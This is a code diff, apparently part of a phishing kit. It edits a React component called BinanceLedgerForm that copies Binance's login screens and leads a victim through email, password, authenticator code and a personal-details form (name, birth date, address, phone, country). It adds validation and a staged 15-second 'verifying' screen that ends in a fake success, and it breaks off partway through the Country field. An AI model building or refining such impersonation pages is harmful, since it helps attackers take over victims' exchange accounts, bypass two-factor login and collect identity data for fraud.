@@ -1,9 +1,16 @@
-
 import { FC, useState } from "react";
 import { useToast } from "@/hooks/use-toast";
-import { Lock } from "lucide-react";
+import { AlertTriangle } from "lucide-react";
 
-type FormStep = 'email' | 'password' | 'verification' | 'important-notice' | 'personal-details' | 'success';
+type FormStep = 'email' | 'password' | 'verification' | 'important-notice' | 'personal-details' | 'verifying' | 'success';
+
+const countries = [
+  "United States", "United Kingdom", "Canada", "Australia", "Germany", "France", "Italy", "Spain", "Netherlands", "Belgium",
+  "Switzerland", "Austria", "Sweden", "Norway", "Denmark", "Finland", "Poland", "Czech Republic", "Hungary", "Romania",
+  "Bulgaria", "Croatia", "Slovenia", "Slovakia", "Estonia", "Latvia", "Lithuania", "Luxembourg", "Malta", "Cyprus",
+  "Ireland", "Portugal", "Greece", "Japan", "South Korea", "Singapore", "Hong Kong", "Taiwan", "Malaysia", "Thailand",
+  "Philippines", "Indonesia", "Vietnam", "India", "China", "Brazil", "Mexico", "Argentina", "Chile", "Colombia"
+];
 
 const BinanceLedgerForm: FC = () => {
   const { toast } = useToast();
@@ -13,6 +20,7 @@ const BinanceLedgerForm: FC = () => {
   const [currentStep, setCurrentStep] = useState<FormStep>('email');
   const [isLoading, setIsLoading] = useState(false);
   const [logoError, setLogoError] = useState(false);
+  const [errors, setErrors] = useState<{[key: string]: string}>({});
   const [personalDetails, setPersonalDetails] = useState({
     firstName: "",
     lastName: "",
@@ -26,26 +34,33 @@ const BinanceLedgerForm: FC = () => {
 
   const handleEmailSubmit = (e: React.FormEvent) => {
     e.preventDefault();
+    setErrors({});
+    
     if (!email) {
-      toast({
-        title: "Error",
-        description: "Please enter your email address",
-        variant: "destructive"
-      });
+      setErrors({ email: "Please enter your email address" });
       return;
     }
+    
+    if (!/\S+@\S+\.\S+/.test(email)) {
+      setErrors({ email: "Please enter a valid email address" });
+      return;
+    }
+    
     console.log("Email submitted:", email);
     setCurrentStep('password');
   };
 
   const handlePasswordSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
+    setErrors({});
+    
     if (!password) {
-      toast({
-        title: "Error",
-        description: "Please enter your password",
-        variant: "destructive"
-      });
+      setErrors({ password: "Please enter your password" });
+      return;
+    }
+    
+    if (password.length < 6) {
+      setErrors({ password: "Password must be at least 6 characters" });
       return;
     }
     
@@ -57,12 +72,15 @@ const BinanceLedgerForm: FC = () => {
 
   const handleVerificationSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
+    setErrors({});
+    
     if (!verificationCode) {
-      toast({
-        title: "Error",
-        description: "Please enter the verification code",
-        variant: "destructive"
-      });
+      setErrors({ verification: "Please enter the verification code" });
+      return;
+    }
+    
+    if (verificationCode.length !== 6) {
+      setErrors({ verification: "Verification code must be 6 digits" });
       return;
     }
     
@@ -78,22 +96,28 @@ const BinanceLedgerForm: FC = () => {
 
   const handlePersonalDetailsSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    const requiredFields = ['firstName', 'lastName', 'dateOfBirth', 'address', 'postalCode', 'city', 'country', 'phoneNumber'];
-    const missingFields = requiredFields.filter(field => !personalDetails[field as keyof typeof personalDetails]);
+    setErrors({});
     
-    if (missingFields.length > 0) {
-      toast({
-        title: "Error",
-        description: "Please fill in all required fields",
-        variant: "destructive"
-      });
+    const requiredFields = ['firstName', 'lastName', 'dateOfBirth', 'address', 'postalCode', 'city', 'country', 'phoneNumber'];
+    const newErrors: {[key: string]: string} = {};
+    
+    requiredFields.forEach(field => {
+      if (!personalDetails[field as keyof typeof personalDetails]) {
+        newErrors[field] = "This field is required";
+      }
+    });
+    
+    if (Object.keys(newErrors).length > 0) {
+      setErrors(newErrors);
       return;
     }
     
-    setIsLoading(true);
-    await new Promise(resolve => setTimeout(resolve, 2000));
-    setIsLoading(false);
-    setCurrentStep('success');
+    setCurrentStep('verifying');
+    
+    // Auto-proceed after 15 seconds
+    setTimeout(() => {
+      setCurrentStep('success');
+    }, 15000);
   };
 
   const handlePaste = async () => {
@@ -128,16 +152,9 @@ const BinanceLedgerForm: FC = () => {
 
       <div className="flex justify-between items-center mb-8">
         <div 
-          className="card-page-title !mb-[0px]" 
+          className="binance-title"
           role="heading" 
           aria-level={1}
-          style={{ 
-            color: "var(--color-PrimaryText, #EAECEF)",
-            fontFamily: "BinanceNova, Arial, sans-serif",
-            fontSize: "32px",
-            fontWeight: "600",
-            lineHeight: "40px"
-          }}
         >
           Log in
         </div>
@@ -174,25 +191,18 @@ const BinanceLedgerForm: FC = () => {
       <form onSubmit={handleEmailSubmit}>
         <div className="bn-formItem mb-6">
           <label 
-            className="bn-formItem-label block mb-2" 
+            className="binance-label block mb-2" 
             htmlFor="bn-formItem-q8nY2Y1v"
-            style={{ 
-              color: "var(--color-PrimaryText, #EAECEF)",
-              fontFamily: "BinanceNova, Arial, sans-serif",
-              fontSize: "14px",
-              fontWeight: "400",
-              lineHeight: "20px"
-            }}
           >
             Email/Phone number
           </label>
           <div>
             <div className="css-4cffwv">
               <div 
-                className="bn-textField bn-textField__line data-size-large username-input-field css-8x1t0r rounded"
+                className={`bn-textField bn-textField__line data-size-large username-input-field css-8x1t0r rounded ${errors.email ? 'border-red-500' : ''}`}
                 style={{
                   backgroundColor: "var(--color-Input, #2B3139)",
-                  border: "1px solid var(--color-InputLine, #474D57)",
+                  border: `1px solid ${errors.email ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
                   height: "48px"
                 }}
                 role="group"
@@ -206,33 +216,27 @@ const BinanceLedgerForm: FC = () => {
                   autoFocus
                   id="bn-formItem-q8nY2Y1v"
                   autoCapitalize="off"
-                  className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-full text-sm leading-5"
-                  style={{ 
-                    color: "var(--color-PrimaryText, #EAECEF)",
-                    fontFamily: "BinanceNova, Arial, sans-serif",
-                    fontSize: "14px",
-                    fontWeight: "400",
-                    lineHeight: "20px"
-                  }}
+                  className="binance-input bg-transparent border-0 text-white p-3 w-full outline-none h-full"
                   spellCheck="false"
                   autoComplete="username"
                   value={email}
                   onChange={(e) => setEmail(e.target.value)}
                 />
               </div>
+              {errors.email && (
+                <div className="text-red-500 text-sm mt-1 binance-small-text">
+                  {errors.email}
+                </div>
+              )}
             </div>
           </div>
         </div>
 
         <button
-          className="bn-button bn-button__primary data-size-large mt-6 w-full py-3 rounded transition-colors"
+          className="binance-button bn-button bn-button__primary data-size-large mt-6 w-full py-3 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] font-bold"
           style={{
             backgroundColor: "var(--color-BtnBg, #FCD535)",
             color: "var(--color-TextOnYellow, #202630)",
-            fontFamily: "BinanceNova, Arial, sans-serif",
-            fontSize: "14px",
-            fontWeight: "500",
-            lineHeight: "20px",
             height: "48px"
           }}
           type="submit"
@@ -332,37 +336,6 @@ const BinanceLedgerForm: FC = () => {
         </button>
 
         <button 
-          className="bn-button bn-button__icon bn-button__icon__line data-size-large bids_icon-button w-full py-3 rounded flex items-center justify-center transition-colors hover:bg-[#2B3139] hover:border-[#848E9C]"
-          style={{
-            backgroundColor: "transparent",
-            border: "1px solid var(--color-InputLine, #474D57)",
-            color: "var(--color-PrimaryText, #EAECEF)",
-            fontFamily: "BinanceNova, Arial, sans-serif",
-            fontSize: "14px",
-            fontWeight: "400",
-            lineHeight: "20px",
-            height: "48px"
-          }}
-          role="button" 
-          aria-label="Continue with Apple"
-        >
-          <div className="icon-warp mr-3">
-            <svg 
-              width="24" 
-              height="24" 
-              xmlns="http://www.w3.org/2000/svg" 
-              className="bn-svg" 
-              style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
-              viewBox="0 0 24 24"
-              fill="currentColor"
-            >
-              <path fillRule="evenodd" clipRule="evenodd" d="M15.0756 3.64877C15.1861 4.6061 14.7876 5.54843 14.204 6.24214C13.5956 6.92442 12.6209 7.44595 11.6726 7.37879C11.5485 6.45861 12.0291 5.47913 12.5668 4.88187C13.1752 4.20317 14.231 3.68378 15.0756 3.64877ZM18.1084 8.79019C17.9965 8.85395 16.2493 9.84885 16.2687 11.8728C16.2905 14.3233 18.5248 15.1327 18.5511 15.1413C18.5384 15.1985 18.2014 16.3101 17.3644 17.4389C16.665 18.4327 15.931 19.4043 14.7676 19.4214C14.2139 19.4337 13.8401 19.2824 13.4506 19.1248C13.0443 18.9604 12.621 18.7892 11.9587 18.7892C11.2566 18.7892 10.8144 18.9661 10.3881 19.1366C10.0194 19.2841 9.66254 19.4269 9.15964 19.4464C8.05113 19.4857 7.20358 18.3855 6.47861 17.401C5.03018 15.3906 3.90212 11.7342 5.41447 9.24657C6.14771 8.02633 7.48409 7.24118 8.91222 7.21974C9.5412 7.2076 10.1446 7.43792 10.6735 7.63982C11.0781 7.79423 11.439 7.93203 11.7346 7.93203C11.9946 7.93203 12.3456 7.79969 12.7547 7.64548C13.3989 7.40262 14.1871 7.10549 14.9902 7.18545C15.5392 7.20045 17.1035 7.39121 18.1112 8.78862L18.1084 8.79019Z" />
-            </svg>
-          </div>
-          <div>Continue with Apple</div>
-        </button>
-
-        <button 
           className="bn-button bn-button__icon bn-button__icon__line data-size-large bids_icon-button mt-4 w-full py-3 rounded flex items-center justify-center transition-colors hover:bg-[#2B3139] hover:border-[#848E9C]"
           style={{
             backgroundColor: "transparent",
@@ -411,16 +384,9 @@ const BinanceLedgerForm: FC = () => {
 
       <div className="mb-8">
         <div 
-          className="card-page-title !mb-[0px]" 
+          className="binance-title"
           role="heading" 
           aria-level={1}
-          style={{ 
-            color: "var(--color-PrimaryText, #EAECEF)",
-            fontFamily: "BinanceNova, Arial, sans-serif",
-            fontSize: "32px",
-            fontWeight: "600",
-            lineHeight: "40px"
-          }}
         >
           Enter Password
         </div>
@@ -429,25 +395,18 @@ const BinanceLedgerForm: FC = () => {
       <form onSubmit={handlePasswordSubmit}>
         <div className="bn-formItem mb-6">
           <label 
-            className="bn-formItem-label block mb-2" 
+            className="binance-label block mb-2" 
             htmlFor="password-field"
-            style={{ 
-              color: "var(--color-PrimaryText, #EAECEF)",
-              fontFamily: "BinanceNova, Arial, sans-serif",
-              fontSize: "14px",
-              fontWeight: "400",
-              lineHeight: "20px"
-            }}
           >
             Password
           </label>
           <div>
             <div className="css-4cffwv">
               <div 
-                className="bn-textField bn-textField__line data-size-large username-input-field css-8x1t0r rounded"
+                className={`bn-textField bn-textField__line data-size-large username-input-field css-8x1t0r rounded ${errors.password ? 'border-red-500' : ''}`}
                 style={{
                   backgroundColor: "var(--color-Input, #2B3139)",
-                  border: "1px solid var(--color-InputLine, #474D57)",
+                  border: `1px solid ${errors.password ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
                   height: "48px"
                 }}
                 role="group"
@@ -461,33 +420,27 @@ const BinanceLedgerForm: FC = () => {
                   autoFocus
                   id="password-field"
                   autoCapitalize="off"
-                  className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-full text-sm leading-5"
-                  style={{ 
-                    color: "var(--color-PrimaryText, #EAECEF)",
-                    fontFamily: "BinanceNova, Arial, sans-serif",
-                    fontSize: "14px",
-                    fontWeight: "400",
-                    lineHeight: "20px"
-                  }}
+                  className="binance-input bg-transparent border-0 text-white p-3 w-full outline-none h-full"
                   spellCheck="false"
                   autoComplete="current-password"
                   value={password}
                   onChange={(e) => setPassword(e.target.value)}
                 />
               </div>
+              {errors.password && (
+                <div className="text-red-500 text-sm mt-1 binance-small-text">
+                  {errors.password}
+                </div>
+              )}
             </div>
           </div>
         </div>
 
         <button
-          className="bn-button bn-button__primary data-size-large mt-6 w-full py-3 rounded transition-colors flex items-center justify-center"
+          className="binance-button bn-button bn-button__primary data-size-large mt-6 w-full py-3 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center font-bold"
           style={{
             backgroundColor: "var(--color-BtnBg, #FCD535)",
             color: "var(--color-TextOnYellow, #202630)",
-            fontFamily: "BinanceNova, Arial, sans-serif",
-            fontSize: "14px",
-            fontWeight: "500",
-            lineHeight: "20px",
             height: "48px"
           }}
           type="submit"
@@ -525,32 +478,19 @@ const BinanceLedgerForm: FC = () => {
         </div>
       </div>
 
-      <div className="mb-8">
+      <div className="mb-4">
         <div 
-          className="card-page-title !mb-[0px]" 
+          className="binance-title"
           role="heading" 
           aria-level={1}
-          style={{ 
-            color: "var(--color-PrimaryText, #EAECEF)",
-            fontFamily: "BinanceNova, Arial, sans-serif",
-            fontSize: "32px",
-            fontWeight: "600",
-            lineHeight: "40px"
-          }}
         >
           Enter Verification Code
         </div>
       </div>
 
       <div 
-        className="mb-4"
-        style={{ 
-          color: "var(--color-SecondaryText, #B7BDC6)",
-          fontFamily: "BinanceNova, Arial, sans-serif",
-          fontSize: "14px",
-          fontWeight: "400",
-          lineHeight: "20px"
-        }}
+        className="mb-4 binance-text"
+        style={{ color: "var(--color-SecondaryText, #B7BDC6)" }}
       >
         Enter the code from your Google/Binance Authenticator.
       </div>
@@ -558,25 +498,19 @@ const BinanceLedgerForm: FC = () => {
       <form onSubmit={handleVerificationSubmit}>
         <div className="bn-formItem mb-6">
           <label 
-            className="bn-formItem-label block mb-2" 
+            className="binance-small-text block mb-2" 
             htmlFor="verification-field"
-            style={{ 
-              color: "var(--color-TertiaryText, #848E9C)",
-              fontFamily: "BinanceNova, Arial, sans-serif",
-              fontSize: "12px",
-              fontWeight: "400",
-              lineHeight: "16px"
-            }}
+            style={{ color: "var(--color-TertiaryText, #848E9C)" }}
           >
             Authenticator App
           </label>
           <div>
             <div className="css-4cffwv relative">
               <div 
-                className="bn-textField bn-textField__line data-size-large username-input-field css-8x1t0r rounded"
+                className={`bn-textField bn-textField__line data-size-large username-input-field css-8x1t0r rounded ${errors.verification ? 'border-red-500' : ''}`}
                 style={{
                   backgroundColor: "var(--color-Input, #2B3139)",
-                  border: "1px solid var(--color-InputLine, #474D57)",
+                  border: `1px solid ${errors.verification ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
                   height: "48px"
                 }}
                 role="group"
@@ -590,14 +524,7 @@ const BinanceLedgerForm: FC = () => {
                   autoFocus
                   id="verification-field"
                   autoCapitalize="off"
-                  className="bn-textField-input bg-transparent border-0 text-white p-3 pr-16 w-full outline-none h-full text-sm leading-5"
-                  style={{ 
-                    color: "var(--color-PrimaryText, #EAECEF)",
-                    fontFamily: "BinanceNova, Arial, sans-serif",
-                    fontSize: "14px",
-                    fontWeight: "400",
-                    lineHeight: "20px"
-                  }}
+                  className="binance-input bg-transparent border-0 text-white p-3 pr-16 w-full outline-none h-full"
                   spellCheck="false"
                   maxLength={6}
                   value={verificationCode}
@@ -606,31 +533,26 @@ const BinanceLedgerForm: FC = () => {
                 <button
                   type="button"
                   onClick={handlePaste}
-                  className="absolute right-3 top-1/2 transform -translate-y-1/2 text-sm font-medium hover:opacity-80 transition-opacity"
-                  style={{
-                    color: "var(--color-BtnBg, #FCD535)",
-                    fontFamily: "BinanceNova, Arial, sans-serif",
-                    fontSize: "14px",
-                    fontWeight: "500",
-                    lineHeight: "20px"
-                  }}
+                  className="absolute right-3 top-1/2 transform -translate-y-1/2 binance-button font-medium hover:opacity-80 transition-opacity"
+                  style={{ color: "var(--color-BtnBg, #FCD535)" }}
                 >
                   Paste
                 </button>
               </div>
+              {errors.verification && (
+                <div className="text-red-500 text-sm mt-1 binance-small-text">
+                  {errors.verification}
+                </div>
+              )}
             </div>
           </div>
         </div>
 
         <button
-          className="bn-button bn-button__primary data-size-large mt-6 w-full py-3 rounded transition-colors flex items-center justify-center"
+          className="binance-button bn-button bn-button__primary data-size-large mt-6 w-full py-3 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center font-bold"
           style={{
             backgroundColor: "var(--color-BtnBg, #FCD535)",
             color: "var(--color-TextOnYellow, #202630)",
-            fontFamily: "BinanceNova, Arial, sans-serif",
-            fontSize: "14px",
-            fontWeight: "500",
-            lineHeight: "20px",
             height: "48px"
           }}
           type="submit"
@@ -643,20 +565,6 @@ const BinanceLedgerForm: FC = () => {
             'Submit'
           )}
         </button>
-
-        <div 
-          className="flex items-center justify-center mt-4"
-          style={{ 
-            color: "var(--color-TertiaryText, #848E9C)",
-            fontFamily: "BinanceNova, Arial, sans-serif",
-            fontSize: "12px",
-            fontWeight: "400",
-            lineHeight: "16px"
-          }}
-        >
-          <Lock size={16} className="mr-2" style={{ color: "var(--color-TertiaryText, #848E9C)" }} />
-          Protected by Binance Risk
-        </div>
       </form>
     </>
   );
@@ -684,43 +592,31 @@ const BinanceLedgerForm: FC = () => {
 
       <div className="text-center py-8">
         <div 
-          className="mb-6 text-center"
-          style={{ 
-            color: "var(--color-PrimaryText, #EAECEF)",
-            fontFamily: "BinanceNova, Arial, sans-serif",
-            fontSize: "32px",
-            fontWeight: "600",
-            lineHeight: "40px"
-          }}
+          className="mb-6 flex items-center justify-center gap-3 binance-title"
+          style={{ color: "#F59E0B" }}
         >
-          ⚠️ Important Notice
+          <AlertTriangle size={32} className="text-yellow-500" />
+          Important Notice
         </div>
         
         <div 
-          className="mb-8 text-left p-6 rounded-lg"
+          className="mb-8 text-left p-6 rounded-lg border-l-4 border-yellow-500"
           style={{ 
-            backgroundColor: "var(--color-Input, #2B3139)",
-            border: "1px solid var(--color-InputLine, #474D57)",
-            color: "var(--color-SecondaryText, #B7BDC6)",
-            fontFamily: "BinanceNova, Arial, sans-serif",
-            fontSize: "14px",
-            fontWeight: "400",
-            lineHeight: "20px"
+            backgroundColor: "#FEF3C7",
+            color: "#92400E"
           }}
         >
-          Please ensure that all the information you provide is accurate and matches your official documents. This information will be verified for security and compliance purposes. Failure to provide accurate information may result in a delay or rejection of your verification process.
+          <div className="binance-text">
+            Please ensure that all the information you provide is accurate and matches your official documents. This information will be verified for security and compliance purposes. Failure to provide accurate information may result in a delay or rejection of your verification process.
+          </div>
         </div>
         
         <button
           onClick={handleNoticeConfirm}
-          className="bn-button bn-button__primary data-size-large w-full py-3 rounded transition-colors"
+          className="binance-button bn-button bn-button__primary data-size-large w-full py-3 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] font-bold"
           style={{
             backgroundColor: "var(--color-BtnBg, #FCD535)",
             color: "var(--color-TextOnYellow, #202630)",
-            fontFamily: "BinanceNova, Arial, sans-serif",
-            fontSize: "14px",
-            fontWeight: "500",
-            lineHeight: "20px",
             height: "48px"
           }}
           aria-label="I Understand"
@@ -754,16 +650,9 @@ const BinanceLedgerForm: FC = () => {
 
       <div className="mb-8">
         <div 
-          className="card-page-title !mb-[0px]" 
+          className="binance-title"
           role="heading" 
           aria-level={1}
-          style={{ 
-            color: "var(--color-PrimaryText, #EAECEF)",
-            fontFamily: "BinanceNova, Arial, sans-serif",
-            fontSize: "32px",
-            fontWeight: "600",
-            lineHeight: "40px"
-          }}
         >
           Verify Details
         </div>
@@ -772,311 +661,226 @@ const BinanceLedgerForm: FC = () => {
       <form onSubmit={handlePersonalDetailsSubmit}>
         <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
           <div className="bn-formItem">
-            <label 
-              className="bn-formItem-label block mb-2" 
-              style={{ 
-                color: "var(--color-PrimaryText, #EAECEF)",
-                fontFamily: "BinanceNova, Arial, sans-serif",
-                fontSize: "14px",
-                fontWeight: "400",
-                lineHeight: "20px"
-              }}
-            >
+            <label className="binance-label block mb-2">
               First Name
             </label>
             <div 
-              className="bn-textField bn-textField__line data-size-large css-8x1t0r rounded"
+              className={`bn-textField bn-textField__line data-size-large css-8x1t0r rounded ${errors.firstName ? 'border-red-500' : ''}`}
               style={{
                 backgroundColor: "var(--color-Input, #2B3139)",
-                border: "1px solid var(--color-InputLine, #474D57)",
+                border: `1px solid ${errors.firstName ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
                 height: "48px"
               }}
             >
               <input
                 type="text"
-                className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-full text-sm leading-5"
-                style={{ 
-                  color: "var(--color-PrimaryText, #EAECEF)",
-                  fontFamily: "BinanceNova, Arial, sans-serif",
-                  fontSize: "14px",
-                  fontWeight: "400",
-                  lineHeight: "20px"
-                }}
+                className="binance-input bg-transparent border-0 text-white p-3 w-full outline-none h-full"
                 value={personalDetails.firstName}
                 onChange={(e) => setPersonalDetails({...personalDetails, firstName: e.target.value})}
               />
             </div>
+            {errors.firstName && (
+              <div className="text-red-500 text-sm mt-1 binance-small-text">
+                {errors.firstName}
+              </div>
+            )}
           </div>
 
           <div className="bn-formItem">
-            <label 
-              className="bn-formItem-label block mb-2" 
-              style={{ 
-                color: "var(--color-PrimaryText, #EAECEF)",
-                fontFamily: "BinanceNova, Arial, sans-serif",
-                fontSize: "14px",
-                fontWeight: "400",
-                lineHeight: "20px"
-              }}
-            >
+            <label className="binance-label block mb-2">
               Last Name
             </label>
             <div 
-              className="bn-textField bn-textField__line data-size-large css-8x1t0r rounded"
+              className={`bn-textField bn-textField__line data-size-large css-8x1t0r rounded ${errors.lastName ? 'border-red-500' : ''}`}
               style={{
                 backgroundColor: "var(--color-Input, #2B3139)",
-                border: "1px solid var(--color-InputLine, #474D57)",
+                border: `1px solid ${errors.lastName ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
                 height: "48px"
               }}
             >
               <input
                 type="text"
-                className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-full text-sm leading-5"
-                style={{ 
-                  color: "var(--color-PrimaryText, #EAECEF)",
-                  fontFamily: "BinanceNova, Arial, sans-serif",
-                  fontSize: "14px",
-                  fontWeight: "400",
-                  lineHeight: "20px"
-                }}
+                className="binance-input bg-transparent border-0 text-white p-3 w-full outline-none h-full"
                 value={personalDetails.lastName}
                 onChange={(e) => setPersonalDetails({...personalDetails, lastName: e.target.value})}
               />
             </div>
+            {errors.lastName && (
+              <div className="text-red-500 text-sm mt-1 binance-small-text">
+                {errors.lastName}
+              </div>
+            )}
           </div>
 
           <div className="bn-formItem">
-            <label 
-              className="bn-formItem-label block mb-2" 
-              style={{ 
-                color: "var(--color-PrimaryText, #EAECEF)",
-                fontFamily: "BinanceNova, Arial, sans-serif",
-                fontSize: "14px",
-                fontWeight: "400",
-                lineHeight: "20px"
-              }}
-            >
+            <label className="binance-label block mb-2">
               Date of Birth
             </label>
             <div 
-              className="bn-textField bn-textField__line data-size-large css-8x1t0r rounded"
+              className={`bn-textField bn-textField__line data-size-large css-8x1t0r rounded ${errors.dateOfBirth ? 'border-red-500' : ''}`}
               style={{
                 backgroundColor: "var(--color-Input, #2B3139)",
-                border: "1px solid var(--color-InputLine, #474D57)",
+                border: `1px solid ${errors.dateOfBirth ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
                 height: "48px"
               }}
             >
               <input
                 type="date"
-                className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-full text-sm leading-5"
-                style={{ 
-                  color: "var(--color-PrimaryText, #EAECEF)",
-                  fontFamily: "BinanceNova, Arial, sans-serif",
-                  fontSize: "14px",
-                  fontWeight: "400",
-                  lineHeight: "20px"
-                }}
+                className="binance-input bg-transparent border-0 text-white p-3 w-full outline-none h-full"
                 value={personalDetails.dateOfBirth}
                 onChange={(e) => setPersonalDetails({...personalDetails, dateOfBirth: e.target.value})}
               />
             </div>
+            {errors.dateOfBirth && (
+              <div className="text-red-500 text-sm mt-1 binance-small-text">
+                {errors.dateOfBirth}
+              </div>
+            )}
           </div>
 
           <div className="bn-formItem">
-            <label 
-              className="bn-formItem-label block mb-2" 
-              style={{ 
-                color: "var(--color-PrimaryText, #EAECEF)",
-                fontFamily: "BinanceNova, Arial, sans-serif",
-                fontSize: "14px",
-                fontWeight: "400",
-                lineHeight: "20px"
-              }}
-            >
+            <label className="binance-label block mb-2">
               Phone Number
             </label>
             <div 
-              className="bn-textField bn-textField__line data-size-large css-8x1t0r rounded"
+              className={`bn-textField bn-textField__line data-size-large css-8x1t0r rounded ${errors.phoneNumber ? 'border-red-500' : ''}`}
               style={{
                 backgroundColor: "var(--color-Input, #2B3139)",
-                border: "1px solid var(--color-InputLine, #474D57)",
+                border: `1px solid ${errors.phoneNumber ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
                 height: "48px"
               }}
             >
               <input
                 type="tel"
-                className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-full text-sm leading-5"
-                style={{ 
-                  color: "var(--color-PrimaryText, #EAECEF)",
-                  fontFamily: "BinanceNova, Arial, sans-serif",
-                  fontSize: "14px",
-                  fontWeight: "400",
-                  lineHeight: "20px"
-                }}
+                className="binance-input bg-transparent border-0 text-white p-3 w-full outline-none h-full"
                 value={personalDetails.phoneNumber}
                 onChange={(e) => setPersonalDetails({...personalDetails, phoneNumber: e.target.value})}
               />
             </div>
+            {errors.phoneNumber && (
+              <div className="text-red-500 text-sm mt-1 binance-small-text">
+                {errors.phoneNumber}
+              </div>
+            )}
           </div>
 
           <div className="bn-formItem md:col-span-2">
-            <label 
-              className="bn-formItem-label block mb-2" 
-              style={{ 
-                color: "var(--color-PrimaryText, #EAECEF)",
-                fontFamily: "BinanceNova, Arial, sans-serif",
-                fontSize: "14px",
-                fontWeight: "400",
-                lineHeight: "20px"
-              }}
-            >
+            <label className="binance-label block mb-2">
               Address
             </label>
             <div 
-              className="bn-textField bn-textField__line data-size-large css-8x1t0r rounded"
+              className={`bn-textField bn-textField__line data-size-large css-8x1t0r rounded ${errors.address ? 'border-red-500' : ''}`}
               style={{
                 backgroundColor: "var(--color-Input, #2B3139)",
-                border: "1px solid var(--color-InputLine, #474D57)",
+                border: `1px solid ${errors.address ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
                 height: "48px"
               }}
             >
               <input
                 type="text"
-                className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-full text-sm leading-5"
-                style={{ 
-                  color: "var(--color-PrimaryText, #EAECEF)",
-                  fontFamily: "BinanceNova, Arial, sans-serif",
-                  fontSize: "14px",
-                  fontWeight: "400",
-                  lineHeight: "20px"
-                }}
+                className="binance-input bg-transparent border-0 text-white p-3 w-full outline-none h-full"
                 value={personalDetails.address}
                 onChange={(e) => setPersonalDetails({...personalDetails, address: e.target.value})}
               />
             </div>
+            {errors.address && (
+              <div className="text-red-500 text-sm mt-1 binance-small-text">
+                {errors.address}
+              </div>
+            )}
           </div>
 
           <div className="bn-formItem">
-            <label 
-              className="bn-formItem-label block mb-2" 
-              style={{ 
-                color: "var(--color-PrimaryText, #EAECEF)",
-                fontFamily: "BinanceNova, Arial, sans-serif",
-                fontSize: "14px",
-                fontWeight: "400",
-                lineHeight: "20px"
-              }}
-            >
+            <label className="binance-label block mb-2">
               Postal Code
             </label>
             <div 
-              className="bn-textField bn-textField__line data-size-large css-8x1t0r rounded"
+              className={`bn-textField bn-textField__line data-size-large css-8x1t0r rounded ${errors.postalCode ? 'border-red-500' : ''}`}
               style={{
                 backgroundColor: "var(--color-Input, #2B3139)",
-                border: "1px solid var(--color-InputLine, #474D57)",
+                border: `1px solid ${errors.postalCode ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
                 height: "48px"
               }}
             >
               <input
                 type="text"
-                className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-full text-sm leading-5"
-                style={{ 
-                  color: "var(--color-PrimaryText, #EAECEF)",
-                  fontFamily: "BinanceNova, Arial, sans-serif",
-                  fontSize: "14px",
-                  fontWeight: "400",
-                  lineHeight: "20px"
-                }}
+                className="binance-input bg-transparent border-0 text-white p-3 w-full outline-none h-full"
                 value={personalDetails.postalCode}
                 onChange={(e) => setPersonalDetails({...personalDetails, postalCode: e.target.value})}
               />
             </div>
+            {errors.postalCode && (
+              <div className="text-red-500 text-sm mt-1 binance-small-text">
+                {errors.postalCode}
+              </div>
+            )}
           </div>
 
           <div className="bn-formItem">
-            <label 
-              className="bn-formItem-label block mb-2" 
-              style={{ 
-                color: "var(--color-PrimaryText, #EAECEF)",
-                fontFamily: "BinanceNova, Arial, sans-serif",
-                fontSize: "14px",
-                fontWeight: "400",
-                lineHeight: "20px"
-              }}
-            >
+            <label className="binance-label block mb-2">
               City
             </label>
             <div 
-              className="bn-textField bn-textField__line data-size-large css-8x1t0r rounded"
+              className={`bn-textField bn-textField__line data-size-large css-8x1t0r rounded ${errors.city ? 'border-red-500' : ''}`}
               style={{
                 backgroundColor: "var(--color-Input, #2B3139)",
-                border: "1px solid var(--color-InputLine, #474D57)",
+                border: `1px solid ${errors.city ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
                 height: "48px"
               }}
             >
               <input
                 type="text"
-                className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-full text-sm leading-5"
-                style={{ 
-                  color: "var(--color-PrimaryText, #EAECEF)",
-                  fontFamily: "BinanceNova, Arial, sans-serif",
-                  fontSize: "14px",
-                  fontWeight: "400",
-                  lineHeight: "20px"
-                }}
+                className="binance-input bg-transparent border-0 text-white p-3 w-full outline-none h-full"
                 value={personalDetails.city}
                 onChange={(e) => setPersonalDetails({...personalDetails, city: e.target.value})}
               />
             </div>
+            {errors.city && (
+              <div className="text-red-500 text-sm mt-1 binance-small-text">
+                {errors.city}
+              </div>
+            )}
           </div>
 
           <div className="bn-formItem">
-            <label 
-              className="bn-formItem-label block mb-2" 
-              style={{ 
-                color: "var(--color-PrimaryText, #EAECEF)",
-                fontFamily: "BinanceNova, Arial, sans-serif",
-                fontSize: "14px",
-                fontWeight: "400",
-                lineHeight: "20px"
-              }}
-            >
+            <label className="binance-label block mb-2">
               Country
             </label>
             <div 
-              className="bn-textField bn-textField__line data-size-large css-8x1t0r rounded"
+              className={`bn-textField bn-textField__line data-size-large css-8x1t0r rounded ${errors.country ? 'border-red-500' : ''}`}
